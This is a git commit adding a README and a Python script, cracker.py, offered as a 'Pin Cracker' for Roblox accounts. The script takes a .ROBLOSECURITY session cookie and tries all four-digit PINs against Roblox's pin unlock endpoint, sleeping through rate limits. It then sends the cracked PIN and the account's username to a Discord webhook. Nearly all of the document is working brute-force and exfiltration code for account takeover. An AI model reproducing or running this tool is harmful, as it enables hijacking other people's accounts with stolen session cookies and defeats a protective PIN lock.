ad5fa46554b315c5b582f0b5f7c83b7bf4cc8b86
Disvenine <142717516+Disvenine@users.noreply.github.com>
2023-08-20 21:11:21 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,12 @@
+# Pin Cracker
+An simple pin cracker that sends the pin to your webhook once it's cracked
+# How to use
+1. Get the cracker.py file
+2. Open and run the file
+3. Provide the required details like cookie and webhook
+4. Let it run, it might take a while, but it will crack the pin
+5. Once done, it will automatically send the result to your webhook
+
+
+
+
---
+++ cracker.py
@@ -0,0 +1,96 @@
+import requests
+import re
+import string
+import time
+import os
+
+pingEveryone = True
+print('')
+print('Enter your cookie below:')
+cookie = input()
+os.system("cls")
+print('')
+print('Enter your webhook below:')
+webhook = input()
+os.system("cls")
+print('')
+print('Should we ping Everyone?: ( y / n )')
+pingEveryone = input()
+os.system("cls")
+if pingEveryone.lower == 'y' or pingEveryone == 'yes':
+    ping = '@everyone'
+else:
+    ping = '***Pin Cracked!***'
+os.system("cls")
+
+print('''
+  ██████╗ ██╗███╗  ██╗   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
+  ██╔══██╗██║████╗ ██║  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
+  ██████╔╝██║██╔██╗██║  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
+  ██╔═══╝ ██║██║╚████║  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
+  ██║     ██║██║ ╚███║  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
+  ╚═╝     ╚═╝╚═╝  ╚══╝   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')
+
+url = 'https://auth.roblox.com/v1/account/pin/unlock'
+token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
+xcrsf = (token.headers['x-csrf-token'])
+header = {'X-CSRF-TOKEN': xcrsf}
+
+i = 0
+
+for i in range(9999):
+    try:
+        pin = str(i).zfill(4)
+        payload = {'pin': pin}
+        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
+        if 'unlockedUntil' in r.text:
+            print(f'Pin Cracked! Pin: {pin}')
+            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
+            data = {
+                "content" : ping,
+                "username" : "Pin Cracker",
+                "avatar_url" : "https://cdn.discordapp.com/icons/972835836888502373/be84b6b11cb7b4128d2163e4c05a8e29.png?size=4096"
+            }
+            data["embeds"] = [
+                {
+                    "description" : f"{username}\'s Pin:\n```{pin}```",
+                    "title" : "Cracked Pin!",
+                    "color" : 0x00ffff,
+                }
+            ]
+
+            result = requests.post(webhook, json = data)
+            input('Press any key to exit')
+            break
+            
+        elif 'Too many requests made' in r.text:
+                
+            print('  Ratelimited, trying again in 60 seconds..')
+            time.sleep(60)
+                
+        elif 'Authorization' in r.text:
+                
+            print('  Error! Is the cookie valid?')
+            break
+            
+        elif 'Incorrect' in r.text:
+            print(f"  Tried: {pin} , Incorrect!")
+            time.sleep(10)  
+    except:
+        print('  Error!')
+    
+input('\n  Press any key to exit')
+        
+
+
+        
+
+
+
+    
+        
+            
+        
+
+
+
